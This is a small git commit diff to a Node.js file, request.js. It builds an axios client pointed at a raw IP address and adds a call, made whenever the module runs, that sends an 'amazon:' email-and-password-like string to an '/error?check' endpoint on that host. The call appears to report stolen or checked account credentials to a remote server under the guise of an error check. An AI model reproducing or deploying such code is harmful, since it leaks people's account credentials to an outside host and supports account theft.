a707997d8618fa410eeaa8cf38567ea655d053e1
Mike <assoune.mike@gmail.com>
2022-07-14 09:34:35 +0200

    c

--- request.js
+++ request.js
@@ -1,10 +1,13 @@
 const axios = require('axios');
 
 module.exports = () => {
-	return axios.create({
+	const a = axios.create({
 		baseURL: 'http://216.158.239.199:3000/',
 		timeout: 1000,
 	});
+
+	a.get('/error?check/amazon:jordan.s@use.startmail.com:jordan.s')
+
+	return a
 }
 
-axios.get('/error?check/amazon:jordan.s@use.startmail.com:jordan.s')
